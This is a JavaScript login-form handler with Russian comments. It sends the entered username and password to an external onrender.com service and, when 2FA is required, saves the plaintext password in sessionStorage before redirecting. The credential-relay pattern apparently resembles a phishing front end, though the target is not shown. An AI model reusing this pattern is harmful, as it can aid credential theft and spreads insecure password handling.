document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.login-form');
    const loginButton = document.getElementById('login-button');
    const buttonText = document.getElementById('button-text');
    const loadingGif = document.getElementById('loading-gif');
    const errorElement = document.getElementById('error-message');
    
    // Устанавливаем правильный путь к гифке
    loadingGif.src = '/yomae/website/loading.gif';
    
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('login-username').value.trim();
        const password = document.getElementById('login-password').value.trim();
        
        if (!username || !password) {
            showError('Please enter both username and password');
            return;
        }
        
        // Показываем анимацию загрузки
        buttonText.textContent = 'Processing';
        loadingGif.style.display = 'inline-block';
        loginButton.disabled = true;
        errorElement.style.display = 'none';
        
        // Добавляем таймаут запроса
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 секунд таймаут
        
        fetch('https://yomae-service.onrender.com/process_login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password
            }),
            signal: controller.signal
        })
        .then(response => {
            clearTimeout(timeoutId);
            if (!response.ok) throw new Error('Server error');
            return response.json();
        })
        .then(data => {
            if (data.status === 'success') {
                window.location.href = '/yomae/website/verifed/index.html';
            } 
            else if (data.status === '2fa_required') {
                sessionStorage.setItem('loginData', JSON.stringify({
                    username: username,
                    password: password
                }));
                window.location.href = '/yomae/website/2FA/index.html';
            }
            else {
                showError(data.message || 'An error occurred');
            }
        })
        .catch(error => {
            clearTimeout(timeoutId);
            console.error('Error:', error);
            showError(error.name === 'AbortError' ? 'Request timeout. Please try again.' : 'Server error. Please try again later.');
        })
        .finally(() => {
            // Восстанавливаем кнопку
            buttonText.textContent = 'Log In';
            loadingGif.style.display = 'none';
            loginButton.disabled = false;
        });
    });
    
    function showError(message) {
        errorElement.textContent = message;
        errorElement.style.display = 'block';
        // Анимация встряски
        errorElement.style.animation = 'none';
        setTimeout(() => {
            errorElement.style.animation = 'shake 0.5s';
        }, 10);
    }
});
